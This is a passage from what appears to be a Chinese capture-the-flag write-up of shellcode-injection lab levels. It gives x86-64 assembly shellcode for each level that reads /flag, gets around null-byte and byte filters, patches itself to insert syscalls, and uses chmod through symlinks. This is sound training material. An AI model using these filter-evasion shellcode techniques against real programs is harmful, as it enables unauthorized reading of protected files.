Injection</h3><p>这个模块，使用的不是as和ld来汇编链接了。而是使用gcc编译器。</p><p>gcc是更高级的编译器，更方便，gcc可以自动处理汇编代码。可以根据文件的后缀名自动选择相应的编译器和链接器。gcc可以自动链接标准库以及你指定的其他库。</p><p>as+ld更底层，as汇编器将汇编代码转换为目标代码。目标代码是机器可以理解的二进制代码，但还没有链接成可执行文件。ld是GNU链接器，它将多个目标代码文件链接成可执行文件。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">$ gcc -nostdlib -static <span class="hljs-keyword">shellcode.s </span>-o <span class="hljs-keyword">shellcode-elf </span><br></code></pre></td></tr></table></figure><blockquote><p><code>nostdlib</code>：不链接标准C库(libc)。这意味着不依赖于标准库中的任何函数，例如<code>prinft</code>，<code>malloc</code>等。</p><p><code>-static</code>：这个选项告诉编译器静态链接所有的库函数。所有的库函数代码将被直接包含到最终的可执行文件中，而不是通过动态链接的方式在运行时加载。提高程序可移植性。</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ objcopy <span class="hljs-params">--dump-section</span> <span class="hljs-string">.text=shellcode-raw</span> shellcode-elf<br></code></pre></td></tr></table></figure><blockquote><p>为什么需要objcopy这个命令呢？</p><p>objcopy将编译出来的shellcode-elf中单纯代码部分的机器码给提取出来。如果不这样做的话，gcc编译出来的可执行文件会有其他的机器码，用这个可执行文件作为shellcode传给程序的话，就不能直接起作用了，有其他杂项。</p></blockquote><h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>目的是通过shellcode，读取flag，并将其打印在屏幕上。OK，使用open和sendfile系统调用即可。</p><p><code>sys_sendfile(int out_fd,int in_fd,off_t *offset,size_t count)</code></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">nop</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span># <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span># /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span># read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span># 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span># 标准输出<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span># /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span># offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span># 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span># 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><p>其实，也可以使用read,write系统调用，但是更复杂，需要处理字符串。</p><h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>这关简单，用到之前的技巧，生成0x800个nop即可。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x800</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><p>这一关，需要shellcode中没有空字节。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mov</span> rbx, <span class="hljs-number">0</span>x67616c662f# bb48    <span class="hljs-number">662</span>f    <span class="hljs-number">616</span>c    <span class="hljs-number">0067</span>    <span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>第一句就会有很多空字节，那么可以这么写：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x67616c66</span><br><span class="hljs-keyword">shl</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">8</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x2f</span><br># 66bb    616c    <span class="hljs-number">4867</span>    e3c1    b308    532f<br></code></pre></td></tr></table></figure><p><code>hexdump -x ./shellcode-raw</code>来查看shellcode的机器码。</p><p>因此，其他的也相应进行替换。最终exp如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x67616c662f</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x67616c66</span><br>    <span class="hljs-keyword">shl</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x2f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">shl</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xe8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><p>This challenge requires that your shellcode have no H bytes! 不给有H字节。也就是<code>48</code></p><p>那就将所有的内容都换成<code>push/pop</code>即可。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x67616c662f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x616c662f</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">0x67</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x2</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x1</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">r10</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">40</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">60</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>不让用<code>syscall(0x0f05)</code>，<code>sysenter(0x0f34)</code>和<code>int(0x80cd)</code></p><p>题目提示是：绕过的一种方法是让shellcode修改自己，以便在运行时插入<code>syscall</code>指令。</p><blockquote><p>那么实际操作起来就是，将syscall的0x0f05成为一个字节值，即将0x0e05作为一个字节存储于代码段中，然后通过inc指令加1，使得第一个字节0e变成0f，并执行这个机器码，成功调用syscall即可。</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span># <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span># /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span># read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span># 系统调用号<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span># 标准输出<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span># /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span># offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span># 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span># 系统调用号<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br><br></code></pre></td></tr></table></figure><blockquote><p><code>gcc -Wl,-N --static -nostdlib -o shellcode-elf shellcode.s</code></p><p>要记住编译时需要使用这些参数，以保证.text段是可写的，因此才能修改.byte 0x0e.</p></blockquote><h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>前4096个字节不给写的权限，那我直接填充这4MB的空间即可。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-meta">.rept</span> <span class="hljs-number">0x1000</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-meta">.endr</span><br></code></pre></td></tr></table></figure><p>nop填充即可。</p><h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>不给输出了现在，那么通过shellcode创建一个文件，然后把flag写进去就好啦。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">nop</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span># <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span># /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span># read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span># 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span>                        # /flag的fd<br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x74756f2f706d742f</span>         # <span class="hljs-string">&quot;/tmp/out&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x00</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x74756f2f706d742f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span>                    # O_WRONLY|O_CREAT<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0777</span>                       # 权限<span class="hljs-number">777</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span># <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r10</span># /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span># offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span># 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span># 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>限制在<code>0x12</code>个字节的shellcode，通过<code>chmod</code>系统调用，修改&#x2F;flag的权限即可。</p><p>好神奇的软链接！</p><blockquote><p>linux下，软链接到一个程序时，修改这个软连接文件会导致原文件的权限也被修改。因此可以通过软链接来重命名一个a文件，0x61这样就能减少字节数。</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>本来想通过<code>jmp [rip+10]</code>指令然后+nop填充来跳过int3的，但是这条指令就占了6个字节。后来发现jmp  标签只需要两个字节。更简单。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> next<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0xa</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol">next:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">60</span># sys_exit<br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>它的过滤器如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint64_t</span> *input = shellcode_mem;<br><span class="hljs-type">int</span> sort_max = shellcode_size / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; sort_max; i++)<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; sort_max-i<span class="hljs-number">-1</span>; j++)<br>        <span class="hljs-keyword">if</span> (input[j] &gt; input[j+<span class="hljs-number">1</span>])<br>        &#123;<br>            <span class="hljs-type">uint64_t</span> x = input[j];<br>            <span class="hljs-type">uint64_t</span> y = input[j+<span class="hljs-number">1</span>];<br>            input[j] = y;<br>            input[j+<span class="hljs-number">1</span>] = x;<br>        &#125;<br></code></pre></td></tr></table></figure><p>而我的shellcode只有13个字节，13&#x2F;8 &#x3D; 1。再减1就是0。那么就不会执行过滤器。所以我执行后就拿到了flag。它实际会将16个字节以上的shellcode进行排序。</p><h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>这道题是level10 加上删去读取stdin。可是使用chmod修改权限的shellcode压根就不需要stdin。网友还是厉害，想到了<code>chmod</code>这个方法。后面的几关都直接过了。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">push</span> <span 